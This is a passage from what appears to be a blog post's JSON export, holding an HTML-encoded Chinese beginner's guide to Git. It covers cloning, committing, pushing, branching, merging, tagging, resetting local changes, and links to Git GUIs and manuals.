title=\"&#x66F4;&#x65B0;&#x4E0E;&#x5408;&#x5E76;\"></a>&#x66F4;&#x65B0;&#x4E0E;&#x5408;&#x5E76;</h3><p>&#x8981;&#x66F4;&#x65B0;&#x4F60;&#x7684;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x81F3;&#x6700;&#x65B0;&#x6539;&#x52A8;&#xFF0C;&#x6267;&#x884C;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git pull</span><br></pre></td></tr></table></figure></p>\n<p>&#x4EE5;&#x5728;&#x4F60;&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x4E2D; &#x83B7;&#x53D6;&#xFF08;fetch&#xFF09; &#x5E76; &#x5408;&#x5E76;&#xFF08;merge&#xFF09; &#x8FDC;&#x7AEF;&#x7684;&#x6539;&#x52A8;&#x3002;<br>&#x8981;&#x5408;&#x5E76;&#x5176;&#x4ED6;&#x5206;&#x652F;&#x5230;&#x4F60;&#x7684;&#x5F53;&#x524D;&#x5206;&#x652F;&#xFF08;&#x4F8B;&#x5982; master&#xFF09;&#xFF0C;&#x6267;&#x884C;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git merge &lt;branch&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x4E24;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;git &#x90FD;&#x4F1A;&#x5C1D;&#x8BD5;&#x53BB;&#x81EA;&#x52A8;&#x5408;&#x5E76;&#x6539;&#x52A8;&#x3002;&#x4E0D;&#x5E78;&#x7684;&#x662F;&#xFF0C;&#x81EA;&#x52A8;&#x5408;&#x5E76;&#x5E76;&#x975E;&#x6B21;&#x6B21;&#x90FD;&#x80FD;&#x6210;&#x529F;&#xFF0C;&#x5E76;&#x53EF;&#x80FD;&#x5BFC;&#x81F4; &#x51B2;&#x7A81;&#xFF08;conflicts&#xFF09;&#x3002; &#x8FD9;&#x65F6;&#x5019;&#x5C31;&#x9700;&#x8981;&#x4F60;&#x4FEE;&#x6539;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x6765;&#x4EBA;&#x8089;&#x5408;&#x5E76;&#x8FD9;&#x4E9B; &#x51B2;&#x7A81;&#xFF08;conflicts&#xFF09; &#x4E86;&#x3002;&#x6539;&#x5B8C;&#x4E4B;&#x540E;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x5C06;&#x5B83;&#x4EEC;&#x6807;&#x8BB0;&#x4E3A;&#x5408;&#x5E76;&#x6210;&#x529F;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add &lt;filename&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5728;&#x5408;&#x5E76;&#x6539;&#x52A8;&#x4E4B;&#x524D;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x67E5;&#x770B;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git diff &lt;<span class=\"built_in\">source</span>_branch&gt; &lt;target_branch&gt;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x6807;&#x7B7E;\"><a href=\"#&#x6807;&#x7B7E;\" class=\"headerlink\" title=\"&#x6807;&#x7B7E;\"></a>&#x6807;&#x7B7E;</h3><p>&#x5728;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x65F6;&#x521B;&#x5EFA;&#x6807;&#x7B7E;&#xFF0C;&#x662F;&#x88AB;&#x63A8;&#x8350;&#x7684;&#x3002;&#x8FD9;&#x662F;&#x4E2A;&#x65E7;&#x6709;&#x6982;&#x5FF5;&#xFF0C;&#x5728; SVN &#x4E2D;&#x4E5F;&#x6709;&#x3002;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x53EB;&#x505A; 1.0.0 &#x7684;&#x6807;&#x7B7E;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git tag 1.0.0 1b2e1d63ff</span><br></pre></td></tr></table></figure></p>\n<p>1b2e1d63ff &#x662F;&#x4F60;&#x60F3;&#x8981;&#x6807;&#x8BB0;&#x7684;&#x63D0;&#x4EA4; ID &#x7684;&#x524D; 10 &#x4F4D;&#x5B57;&#x7B26;&#x3002;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x83B7;&#x53D6;&#x63D0;&#x4EA4; ID&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x8BE5;&#x63D0;&#x4EA4; ID &#x7684;&#x5C11;&#x4E00;&#x4E9B;&#x7684;&#x524D;&#x51E0;&#x4F4D;&#xFF0C;&#x53EA;&#x8981;&#x5B83;&#x662F;&#x552F;&#x4E00;&#x7684;&#x3002;</p>\n<h3 id=\"&#x66FF;&#x6362;&#x672C;&#x5730;&#x6539;&#x52A8;\"><a href=\"#&#x66FF;&#x6362;&#x672C;&#x5730;&#x6539;&#x52A8;\" class=\"headerlink\" title=\"&#x66FF;&#x6362;&#x672C;&#x5730;&#x6539;&#x52A8;\"></a>&#x66FF;&#x6362;&#x672C;&#x5730;&#x6539;&#x52A8;</h3><p>&#x5047;&#x5982;&#x4F60;&#x505A;&#x9519;&#x4E8B;&#xFF08;&#x81EA;&#x7136;&#xFF0C;&#x8FD9;&#x662F;&#x4E0D;&#x53EF;&#x80FD;&#x7684;&#xFF09;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x66FF;&#x6362;&#x6389;&#x672C;&#x5730;&#x6539;&#x52A8;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout -- &lt;filename&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x6B64;&#x547D;&#x4EE4;&#x4F1A;&#x4F7F;&#x7528; HEAD &#x4E2D;&#x7684;&#x6700;&#x65B0;&#x5185;&#x5BB9;&#x66FF;&#x6362;&#x6389;&#x4F60;&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5DF2;&#x6DFB;&#x52A0;&#x5230;&#x7F13;&#x5B58;&#x533A;&#x7684;&#x6539;&#x52A8;&#xFF0C;&#x4EE5;&#x53CA;&#x65B0;&#x6587;&#x4EF6;&#xFF0C;&#x90FD;&#x4E0D;&#x53D7;&#x5F71;&#x54CD;&#x3002;</p>\n<p>&#x5047;&#x5982;&#x4F60;&#x60F3;&#x8981;&#x4E22;&#x5F03;&#x4F60;&#x6240;&#x6709;&#x7684;&#x672C;&#x5730;&#x6539;&#x52A8;&#x4E0E;&#x63D0;&#x4EA4;&#xFF0C;&#x53EF;&#x4EE5;&#x5230;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x83B7;&#x53D6;&#x6700;&#x65B0;&#x7684;&#x7248;&#x672C;&#x5E76;&#x5C06;&#x4F60;&#x672C;&#x5730;&#x4E3B;&#x5206;&#x652F;&#x6307;&#x5411;&#x5230;&#x5B83;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git fetch origin</span><br><span class=\"line\">git reset --hard origin/master</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x6709;&#x7528;&#x7684;&#x8D34;&#x58EB;\"><a href=\"#&#x6709;&#x7528;&#x7684;&#x8D34;&#x58EB;\" class=\"headerlink\" title=\"&#x6709;&#x7528;&#x7684;&#x8D34;&#x58EB;\"></a>&#x6709;&#x7528;&#x7684;&#x8D34;&#x58EB;</h3><p>&#x5185;&#x5EFA;&#x7684;&#x56FE;&#x5F62;&#x5316; git&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gitk</span><br></pre></td></tr></table></figure></p>\n<p>&#x5F69;&#x8272;&#x7684; git &#x8F93;&#x51FA;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config color.ui <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x663E;&#x793A;&#x5386;&#x53F2;&#x8BB0;&#x5F55;&#x65F6;&#xFF0C;&#x53EA;&#x663E;&#x793A;&#x4E00;&#x884C;&#x6CE8;&#x91CA;&#x4FE1;&#x606F;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config format.pretty oneline</span><br></pre></td></tr></table></figure></p>\n<p>&#x4EA4;&#x4E92;&#x5730;&#x6DFB;&#x52A0;&#x6587;&#x4EF6;&#x81F3;&#x7F13;&#x5B58;&#x533A;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add -i</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x94FE;&#x63A5;&#x4E0E;&#x8D44;&#x6E90;\"><a href=\"#&#x94FE;&#x63A5;&#x4E0E;&#x8D44;&#x6E90;\" class=\"headerlink\" title=\"&#x94FE;&#x63A5;&#x4E0E;&#x8D44;&#x6E90;\"></a>&#x94FE;&#x63A5;&#x4E0E;&#x8D44;&#x6E90;</h3><p><strong>&#x56FE;&#x5F62;&#x5316;&#x754C;&#x9762;</strong><br><a href=\"http://gitx.laullon.com/\" target=\"_blank\" rel=\"external\">GitX (L) (OSX, open source)</a><br><a href=\"http://www.git-tower.com/\" target=\"_blank\" rel=\"external\">Tower (OSX)</a><br><a href=\"http://www.sourcetreeapp.com/\" target=\"_blank\" rel=\"external\">Source Tree (OSX, free)</a><br><a href=\"http://mac.github.com/\" target=\"_blank\" rel=\"external\">GitHub for Mac (OSX, free)</a><br><a href=\"https://itunes.apple.com/gb/app/gitbox/id403388357?mt=12\" target=\"_blank\" rel=\"external\">GitBox (OSX)</a></p>\n<p><strong>&#x6307;&#x5357;&#x4E0E;&#x624B;&#x518C;</strong><br><a href=\"https://git-scm.com/book/en/v2\" target=\"_blank\" rel=\"external\">Git &#x793E;&#x533A;&#x53C2;&#x8003;&#x4E66;</a><br><a href=\"http://progit.org/book/\" target=\"_blank\" rel=\"external\">&#x4E13;&#x4E1A; Git</a><br><a href=\"http://think-like-a-git.net/\" target=\"_blank\" rel=\"external\">&#x5982; git &#x601D;&#x8003;</a><br><a href=\"http://help.github.com/\" target=\"_blank\" rel=\"external\">GitHub &#x5E2E;&#x52A9;</a><br><a href=\"http://marklodato.github.com/visual-git-guide/index-en.html\" target=\"_blank\" rel=\"external\">&#x56FE;&#x5F62;&#x5316;&#x7684; Git &#x6307;&#x5357;&#x4E00;&#x5219;</a></p>\n","excerpt":"<h3 id=\"&#x5B89;&#x88C5;\"><a href=\"#&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"&#x5B89;&#x88C5;\"></a>&#x5B89;&#x88C5;</h3><p><a href=\"http://code.google.com/p/git-osx-installer/downloads/list?can=3\">&#x4E0B;&#x8F7D; git OSX &#x7248;</a><br><a href=\"https://code.google.com/hosting/moved?project=msysgit\">&#x4E0B;&#x8F7D; git Windows &#x7248;</a><br><a href=\"https://git-scm.com/book/en%2FGetting-Started-Installing-Git\">&#x4E0B;&#x8F7D; git Linux &#x7248;</a></p>\n<h3 id=\"&#x521B;&#x5EFA;&#x65B0;&#x4ED3;&#x5E93;\"><a href=\"#&#x521B;&#x5EFA;&#x65B0;&#x4ED3;&#x5E93;\" class=\"headerlink\" title=\"&#x521B;&#x5EFA;&#x65B0;&#x4ED3;&#x5E93;\"></a>&#x521B;&#x5EFA;&#x65B0;&#x4ED3;&#x5E93;</h3><p>&#x521B;&#x5EFA;&#x65B0;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x6253;&#x5F00;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git init</span><br></pre></td></tr></table></figure></p>\n<p>&#x4EE5;&#x521B;&#x5EFA;&#x65B0;&#x7684; git &#x4ED3;&#x5E93;&#x3002;</p>\n<h3 id=\"&#x68C0;&#x51FA;&#x4ED3;&#x5E93;\"><a href=\"#&#x68C0;&#x51FA;&#x4ED3;&#x5E93;\" class=\"headerlink\" title=\"&#x68C0;&#x51FA;&#x4ED3;&#x5E93;\"></a>&#x68C0;&#x51FA;&#x4ED3;&#x5E93;</h3><p>&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x7684;&#x514B;&#x9686;&#x7248;&#x672C;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> /path/to/repository</span><br></pre></td></tr></table></figure></p>\n<p>&#x5982;&#x679C;&#x662F;&#x8FDC;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x4ED3;&#x5E93;&#xFF0C;&#x4F60;&#x7684;&#x547D;&#x4EE4;&#x4F1A;&#x662F;&#x8FD9;&#x4E2A;&#x6837;&#x5B50;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> username@host:/path/to/repository</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x5DE5;&#x4F5C;&#x6D41;\"><a href=\"#&#x5DE5;&#x4F5C;&#x6D41;\" class=\"headerlink\" title=\"&#x5DE5;&#x4F5C;&#x6D41;\"></a>&#x5DE5;&#x4F5C;&#x6D41;</h3><p>&#x4F60;&#x7684;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x7531; git &#x7EF4;&#x62A4;&#x7684;&#x4E09;&#x68F5;&#x201C;&#x6811;&#x201D;&#x7EC4;&#x6210;&#x3002;&#x7B2C;&#x4E00;&#x4E2A;&#x662F;&#x4F60;&#x7684;<strong>&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;</strong>&#xFF0C;&#x5B83;&#x6301;&#x6709;&#x5B9E;&#x9645;&#x6587;&#x4EF6;&#xFF1B;&#x7B2C;&#x4E8C;&#x4E2A;&#x662F; <strong>&#x7F13;&#x5B58;&#x533A;&#xFF08;Index&#xFF09;</strong>&#xFF0C;&#x5B83;&#x50CF;&#x4E2A;&#x7F13;&#x5B58;&#x533A;&#x57DF;&#xFF0C;&#x4E34;&#x65F6;&#x4FDD;&#x5B58;&#x4F60;&#x7684;&#x6539;&#x52A8;&#xFF1B;&#x6700;&#x540E;&#x662F;<strong>HEAD</strong>&#xFF0C;&#x6307;&#x5411;&#x4F60;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x63D0;&#x4EA4;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/git%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%93%E6%8C%87%E5%8D%97/1.png\" alt=\"\"><br></p>","more":"<p></p>\n<h3 id=\"&#x6DFB;&#x52A0;&#x4E0E;&#x63D0;&#x4EA4;\"><a href=\"#&#x6DFB;&#x52A0;&#x4E0E;&#x63D0;&#x4EA4;\" class=\"headerlink\" title=\"&#x6DFB;&#x52A0;&#x4E0E;&#x63D0;&#x4EA4;\"></a>&#x6DFB;&#x52A0;&#x4E0E;&#x63D0;&#x4EA4;</h3><p>&#x4F60;&#x53EF;&#x4EE5;&#x8BA1;&#x5212;&#x6539;&#x52A8;&#xFF08;&#x628A;&#x5B83;&#x4EEC;&#x6DFB;&#x52A0;&#x5230;&#x7F13;&#x5B58;&#x533A;&#xFF09;&#xFF0C;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add &lt;filename&gt;</span><br><span class=\"line\">git add *</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x662F; git &#x57FA;&#x672C;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;&#x7684;&#x7B2C;&#x4E00;&#x6B65;&#xFF1B;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x5B9E;&#x9645;&#x63D0;&#x4EA4;&#x6539;&#x52A8;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -m <span class=\"string\">&quot;&#x4EE3;&#x7801;&#x63D0;&#x4EA4;&#x4FE1;&#x606F;&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x73B0;&#x5728;&#xFF0C;&#x4F60;&#x7684;&#x6539;&#x52A8;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;&#x5230;&#x4E86; HEAD&#xFF0C;&#x4F46;&#x662F;&#x8FD8;&#x6CA1;&#x5230;&#x4F60;&#x7684;&#x8FDC;&#x7AEF;&#x4ED3;&#x5E93;&#x3002;</p>\n<h3 id=\"&#x63A8;&#x9001;&#x6539;&#x52A8;\"><a href=\"#&#x63A8;&#x9001;&#x6539;&#x52A8;\" class=\"headerlink\" title=\"&#x63A8;&#x9001;&#x6539;&#x52A8;\"></a>&#x63A8;&#x9001;&#x6539;&#x52A8;</h3><p>&#x4F60;&#x7684;&#x6539;&#x52A8;&#x73B0;&#x5728;&#x5DF2;&#x7ECF;&#x5728;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x7684; HEAD &#x4E2D;&#x4E86;&#x3002;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x5C06;&#x8FD9;&#x4E9B;&#x6539;&#x52A8;&#x63D0;&#x4EA4;&#x5230;&#x8FDC;&#x7AEF;&#x4ED3;&#x5E93;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin master</span><br></pre></td></tr></table></figure></p>\n<p>&#x53EF;&#x4EE5;&#x628A; master &#x6362;&#x6210;&#x4F60;&#x60F3;&#x8981;&#x63A8;&#x9001;&#x7684;&#x4EFB;&#x4F55;&#x5206;&#x652F;&#x3002; </p>\n<p>&#x5982;&#x679C;&#x4F60;&#x8FD8;&#x6CA1;&#x6709;&#x514B;&#x9686;&#x73B0;&#x6709;&#x4ED3;&#x5E93;&#xFF0C;&#x5E76;&#x6B32;&#x5C06;&#x4F60;&#x7684;&#x4ED3;&#x5E93;&#x8FDE;&#x63A5;&#x5230;&#x67D0;&#x4E2A;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x6DFB;&#x52A0;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote add origin &lt;server&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5982;&#x6B64;&#x4F60;&#x5C31;&#x80FD;&#x591F;&#x5C06;&#x4F60;&#x7684;&#x6539;&#x52A8;&#x63A8;&#x9001;&#x5230;&#x6240;&#x6DFB;&#x52A0;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x53BB;&#x4E86;&#x3002;</p>\n<h3 id=\"&#x5206;&#x652F;\"><a href=\"#&#x5206;&#x652F;\" class=\"headerlink\" title=\"&#x5206;&#x652F;\"></a>&#x5206;&#x652F;</h3><p>&#x5206;&#x652F;&#x662F;&#x7528;&#x6765;&#x5C06;&#x7279;&#x6027;&#x5F00;&#x53D1;&#x7EDD;&#x7F18;&#x5F00;&#x6765;&#x7684;&#x3002;&#x5728;&#x4F60;&#x521B;&#x5EFA;&#x4ED3;&#x5E93;&#x7684;&#x65F6;&#x5019;&#xFF0C;master &#x662F;&#x201C;&#x9ED8;&#x8BA4;&#x7684;&#x201D;&#x3002;&#x5728;&#x5176;&#x4ED6;&#x5206;&#x652F;&#x4E0A;&#x8FDB;&#x884C;&#x5F00;&#x53D1;&#xFF0C;&#x5B8C;&#x6210;&#x540E;&#x518D;&#x5C06;&#x5B83;&#x4EEC;&#x5408;&#x5E76;&#x5230;&#x4E3B;&#x5206;&#x652F;&#x4E0A;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/git%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%93%E6%8C%87%E5%8D%97/2.png\" alt=\"\"></p>\n<p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x53EB;&#x505A;&#x201C;feature_x&#x201D;&#x7684;&#x5206;&#x652F;&#xFF0C;&#x5E76;&#x5207;&#x6362;&#x8FC7;&#x53BB;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout -b feature_x</span><br></pre></td></tr></table></figure></p>\n<p>&#x5207;&#x6362;&#x56DE;&#x4E3B;&#x5206;&#x652F;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master</span><br></pre></td></tr></table></figure></p>\n<p>&#x518D;&#x628A;&#x65B0;&#x5EFA;&#x7684;&#x5206;&#x652F;&#x5220;&#x6389;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch <span class=\"_\">-d</span> feature_x</span><br></pre></td></tr></table></figure></p>\n<p>&#x9664;&#x975E;&#x4F60;&#x5C06;&#x5206;&#x652F;&#x63A8;&#x9001;&#x5230;&#x8FDC;&#x7AEF;&#x4ED3;&#x5E93;&#xFF0C;&#x4E0D;&#x7136;&#x8BE5;&#x5206;&#x652F;&#x5C31;&#x662F; &#x4E0D;&#x4E3A;&#x4ED6;&#x4EBA;&#x6240;&#x89C1;&#x7684;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin &lt;branch&gt;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x66F4;&#x65B0;&#x4E0E;&#x5408;&#x5E76;\"><a href=\"#&#x66F4;&#x65B0;&#x4E0E;&#x5408;&#x5E76;\" class=\"headerlink\" title=\"&#x66F4;&#x65B0;&#x4E0E;&#x5408;&#x5E76;\"></a>&#x66F4;&#x65B0;&#x4E0E;&#x5408;&#x5E76;</h3><p>&#x8981;&#x66F4;&#x65B0;&#x4F60;&#x7684;&#x672C;&#x5730;&#x4ED3;&#x5E93;&#x81F3;&#x6700;&#x65B0;&#x6539;&#x52A8;&#xFF0C;&#x6267;&#x884C;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git pull</span><br></pre></td></tr></table></figure></p>\n<p>&#x4EE5;&#x5728;&#x4F60;&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x4E2D; &#x83B7;&#x53D6;&#xFF08;fetch&#xFF09; &#x5E76; &#x5408;&#x5E76;&#xFF08;merge&#xFF09; &#x8FDC;&#x7AEF;&#x7684;&#x6539;&#x52A8;&#x3002;<br>&#x8981;&#x5408;&#x5E76;&#x5176;&#x4ED6;&#x5206;&#x652F;&#x5230;&#x4F60;&#x7684;&#x5F53;&#x524D;&#x5206;&#x652F;&#xFF08;&#x4F8B;&#x5982; master&#xFF09;&#xFF0C;&#x6267;&#x884C;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git merge &lt;branch&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x4E24;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;git &#x90FD;&#x4F1A;&#x5C1D;&#x8BD5;&#x53BB;&#x81EA;&#x52A8;&#x5408;&#x5E76;&#x6539;&#x52A8;&#x3002;&#x4E0D;&#x5E78;&#x7684;&#x662F;&#xFF0C;&#x81EA;&#x52A8;&#x5408;&#x5E76;&#x5E76;&#x975E;&#x6B21;&#x6B21;&#x90FD;&#x80FD;&#x6210;&#x529F;&#xFF0C;&#x5E76;&#x53EF;&#x80FD;&#x5BFC;&#x81F4; &#x51B2;&#x7A81;&#xFF08;conflicts&#xFF09;&#x3002; &#x8FD9;&#x65F6;&#x5019;&#x5C31;&#x9700;&#x8981;&#x4F60;&#x4FEE;&#x6539;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x6765;&#x4EBA;&#x8089;&#x5408;&#x5E76;&#x8FD9;&#x4E9B; &#x51B2;&#x7A81;&#xFF08;conflicts&#xFF09; &#x4E86;&#x3002;&#x6539;&#x5B8C;&#x4E4B;&#x540E;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x5C06;&#x5B83;&#x4EEC;&#x6807;&#x8BB0;&#x4E3A;&#x5408;&#x5E76;&#x6210;&#x529F;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add &lt;filename&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5728;&#x5408;&#x5E76;&#x6539;&#x52A8;&#x4E4B;&#x524D;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x67E5;&#x770B;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git diff &lt;<span class=\"built_in\">source</span>_branch&gt; &lt;target_branch&gt;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"&#x6807;&#x7B7E;\"><a href=\"#&#x6807;&#x7B7E;\" class=\"headerlink\" title=\"&#x6807;&#x7B7E;\"></a>&#x6807;&#x7B7E;</h3><p>&#x5728;&#x8F6F;&#x4EF6;&#x53D1;&#x5E03;&#x65F6;&#x521B;&#x5EFA;&#x6807;&#x7B7E;&#xFF0C;&#x662F;&#x88AB;&#x63A8;&#x8350;&#x7684;&#x3002;&#x8FD9;&#x662F;&#x4E2A;&#x65E7;&#x6709;&#x6982;&#x5FF5;&#xFF0C;&#x5728; SVN &#x4E2D;&#x4E5F;&#x6709;&#x3002;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x53EB;&#x505A; 1.0.0 &#x7684;&#x6807;&#x7B7E;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git tag 1.0.0 1b2e1d63ff</span><br></pre></td></tr></table></figure></p>\n<p>1b2e1d63ff &#x662F;&#x4F60;&#x60F3;&#x8981;&#x6807;&#x8BB0;&#x7684;&#x63D0;&#x4EA4; ID &#x7684;&#x524D; 10 &#x4F4D;&#x5B57;&#x7B26;&#x3002;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x83B7;&#x53D6;&#x63D0;&#x4EA4; ID&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span 